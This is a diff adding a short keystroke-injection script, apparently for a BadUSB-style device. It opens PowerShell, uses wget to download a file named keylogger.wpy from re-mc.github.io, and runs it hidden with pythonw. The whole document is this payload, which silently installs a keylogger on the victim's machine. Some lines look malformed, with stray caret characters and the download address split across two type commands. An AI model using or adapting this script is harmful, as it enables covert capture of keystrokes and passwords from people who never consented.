@@ -1,0 +1,10 @@
+#clicking
+#typing
+META
+delay 4
+type power^shell
+ENTER
+delay 10
+type wget^
+type re-mc.github.io/keylogger.wpy
+pythonw keylogger.wpy
